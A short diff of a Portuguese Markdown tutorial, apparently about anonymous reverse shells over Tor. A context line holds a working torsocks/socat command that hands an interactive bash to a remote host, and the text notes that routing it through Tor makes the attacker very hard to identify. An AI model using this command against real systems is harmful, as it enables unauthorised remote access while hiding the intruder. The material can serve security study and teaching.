@@ -119,8 +119,7 @@ torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$HOST:$PORT
 
 ## Observação
 
-Vale lembrar que você pode criptografar o shell reverso na rede tor usando o openssl como foi mostrado acima. Mas por causa das camadas de criptografia da rede, a conexão ficará muito lenta! Podemos dizer que é extremamente difícil identificar o atacante. Abaixo coloquei alguns links de algumas pessoas conhecidas no meio de cyber security.
-
+Vale lembrar que você pode criptografar o shell reverso na rede tor usando o openssl como foi mostrado acima. Mas por causa das camadas de criptografia da rede, a conexão ficará muito lenta! Podemos dizer que é extremamente difícil identificar o atacante.
 ## **📚 Referências**
 
 - [Van Houser](https://github.com/vanhauser-thc?tab=repositories) participação na série Mr. Robot, criador do Hydra, [etc...](https://www.thc.org/)
